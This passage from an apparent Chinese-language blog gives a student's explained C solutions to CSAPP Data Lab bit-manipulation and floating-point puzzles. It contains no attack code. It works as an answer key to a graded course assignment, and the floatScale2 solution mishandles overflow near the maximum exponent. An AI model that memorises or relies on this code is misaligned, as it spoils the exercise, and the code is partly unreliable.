title="howManyBits"></a>howManyBits</h1><p>思路</p><ol><li>如果用补码来表示x，最少需要多少位？</li><li>首先对于正数，符号位一定是0，因此只需要找到最高位的1</li><li>其次对于负数，符号位一定是1，需要找到最高位的0，因为高位连续多个1其实就相当于一个1。为了方便起见，将负数取反，那么就和正数一样变成求最高位的1的问题。</li><li>如何求最高位的1？使用二分的思想<ol><li>首先判断高16位是否全0<ol><li>如果不是全0，那么低16位肯定是需要的，将16加到答案里去，再右移16位，接下来再去处理高16位</li><li>如果是全0，那么低16不一定需要，不用加到答案里去。接下来继续处理低16位</li></ol></li><li>接下来就是判断当前的8位。<ol><li>注意了，这里的8位有可能是原来的八位，也有可能是高16位经过右移之后变成了新的低16位的八位！</li></ol></li><li>然后就是不断的二分下去，直到只剩下一位</li><li>如果这一位是1，说明还需要1位。如果为0，则说明这一位不需要了。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 如果是正数，那么直接求x的最高位1，如果是负数，则是要求最高位的0</span><br>  <span class="hljs-comment">// 假设这个最高位为第x位，则答案案为x+1位，因为正数需要加上符号0，负数需要加上符号1</span><br>  <span class="hljs-comment">// 对于负数，先预处理，将所有的1变成0，所有的0变成1</span><br>  <span class="hljs-comment">// 如果x为正数，则help为0，如果x为负数，则help为0xffffffff</span><br>  <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> help = x &gt;&gt; <span class="hljs-number">31</span>;<br>  <span class="hljs-comment">// 通过help将x的1变成0,0变成1。若help为0，则x不变，若help为全1，则完成转换的任务</span><br>  x = x ^ help;<br>  <span class="hljs-comment">// 下面就统一为了计算最高位的1所在的位置</span><br>  <span class="hljs-comment">// 如果高16位不为0，则has_high_16为1，否则为0</span><br>  <span class="hljs-type">int</span> has_high_16 = !!(x &gt;&gt; <span class="hljs-number">16</span>);<br>  <span class="hljs-comment">// 如果高16位存在，即has_high_16为1，那么说明低16位肯定跑不掉了，正好就是has_high_16&lt;&lt;4</span><br>  <span class="hljs-comment">// 如果高16位不存在，has_high_16为0，低16位就不一定都要，此时左移4位正好是0</span><br>  <span class="hljs-type">int</span> add_bits = has_high_16 &lt;&lt; <span class="hljs-number">4</span>;<br>  ans += add_bits;<br>  <span class="hljs-comment">// 又是一个很巧妙的操作，如果add_bits不为0，说明低16位肯定是需要的，那么就不用管低16位，直接移位</span><br>  <span class="hljs-comment">// 如果add__bits为0，说明高16位肯定不需要，低16位可能需要，那么此时右移0位，接下来正常处理低16位</span><br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_8 = !!(x &gt;&gt; <span class="hljs-number">8</span>);<br>  add_bits = has_high_8 &lt;&lt; <span class="hljs-number">3</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>);<br>  add_bits = has_high_4 &lt;&lt; <span class="hljs-number">2</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>);<br>  add_bits = has_high_2 &lt;&lt; <span class="hljs-number">1</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  add_bits = has_high_1 &lt;&lt; <span class="hljs-number">0</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-comment">// x可能现在是1</span><br>  ans += x;<br><br>  <span class="hljs-keyword">return</span> ans + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><p>思路</p><ol><li>将一个浮点数乘2，这个浮点数以无符号整数的形式给出</li><li>uf是NaN一类指数为11111111的，直接返回</li><li>uf是非规格化数，直接将小数部分乘2</li><li>uf是规格化数，将指数加1就可以完成乘2的效果了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-comment">// 分别取出符号，指数，以及有效数位，</span><br>  <span class="hljs-comment">// 其中有效的取出比较tricky，是对sign和e的对应位置进行异或，即将高9位都置为0，剩下的就是有效数位了</span><br>  <span class="hljs-type">unsigned</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">unsigned</span> e = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">unsigned</span> f = uf ^ (sign &lt;&lt; <span class="hljs-number">31</span>) ^ (e &lt;&lt; <span class="hljs-number">23</span>);<br>  <span class="hljs-comment">// 如果uf为NaN等特殊值，即指数为全1，直接返回这个特殊值本身</span><br>  <span class="hljs-keyword">if</span> (!(e ^ <span class="hljs-number">0xff</span>)) &#123;<br>    <span class="hljs-keyword">return</span> uf;<br>  &#125;<br>  <span class="hljs-comment">// 如果uf为非规格化的数，即指数为0，直接将f*2即可</span><br>  <span class="hljs-comment">// 这里感觉有点问题，如果这个非规格数*2后达到了规格数的范围了，是不是要额外处理？</span><br>  <span class="hljs-keyword">if</span> (!e) &#123;<br>    <span class="hljs-keyword">return</span> (sign &lt;&lt; <span class="hljs-number">31</span>) | (f &lt;&lt; <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 如果uf为规格化的数</span><br>  <span class="hljs-keyword">return</span> (sign &lt;&lt; <span class="hljs-number">31</span>) | ((e + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">23</span>) | (f);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><p>思路</p><ol><li>将浮点数转为整数</li><li>如果这个浮点数超出了int的范围，直接返回0x80000000</li><li>如果这个浮点数的阶数小于0，说明还需要将小数部分除一个2的倍数，在int里肯定直接化为0了，因此直接返回0</li><li>否则的话，按具体情况对小数部分进行移位运算<ol><li>这里虽然叫小数部分，但是其实因为这个float类型的变量是用int类型给出的，因此这里的小数部分已经是默认左移23位的了。需要考虑这个因素。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-comment">// 分别取出符号，指数，以及有效数位，</span><br>  <span class="hljs-comment">// 其中有效位的取出比较tricky，是对sign和e的对应位置进行异或，即将高9位都置为0，剩下的就是有效数位了</span><br>  <span class="hljs-type">unsigned</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">unsigned</span> e = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">unsigned</span> f = uf ^ (sign &lt;&lt; <span class="hljs-number">31</span>) ^ (e &lt;&lt; <span class="hljs-number">23</span>);<br>  <span class="hljs-comment">// 如果指数大于等于31了，因为要返回的值是int类型，1&lt;&lt;31位直接爆int了，所以返回0x80000000u</span><br>  <span class="hljs-type">int</span> E = e - <span class="hljs-number">127</span>;<br>  <span class="hljs-keyword">if</span> (E &gt;= <span class="hljs-number">31</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果指数小于0了，那么肯定是返回0，因为需要对小数部分除2，那么对int来说，就是0</span><br>  <span class="hljs-keyword">if</span> (E &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// 真正的小数部分，是有一个隐藏的1在最前面的，这里不用考虑非规格化数，因为它已经在前面的E&lt;0里给淘汰了</span><br>  <span class="hljs-type">int</span> frac = f | <span class="hljs-number">0x800000</span>;<br>  <span class="hljs-comment">// 这个小数部分是用整数来表示的，即默认左移了23位，那么当前的移位应该减去23</span><br>  <span class="hljs-type">int</span> real_f = (E &gt; <span class="hljs-number">23</span>) ? (frac &lt;&lt; (E - <span class="hljs-number">23</span>)) : (frac &gt;&gt; (<span class="hljs-number">23</span> - E));<br>  <span class="hljs-keyword">return</span> sign ? -real_f : real_f;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><p>思路</p><ol><li>将$2^x$用浮点数表示</li><li>符号位和小数部分一定是纯0，因此只需要考虑阶码</li><li>如果阶码小于等于0，直接return 0</li><li>如果阶码超过了0xff，return INF，即0x7f800000</li><li>如果正常的话，直接将阶码左移23位就得到这个浮点数了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 得到阶码</span><br>  <span class="hljs-type">int</span> e = x + <span class="hljs-number">127</span>;<br>  <span class="hljs-comment">// 非规格数，直接返回0</span><br>  <span class="hljs-keyword">if</span> (e &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// 无穷</span><br>  <span class="hljs-keyword">if</span> (e &gt;= <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>;<br>  &#125;<br>  <span class="hljs-comment">// 规格数，符号位0，小数部分也是0</span><br>  <span class="hljs-keyword">return</span> e &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
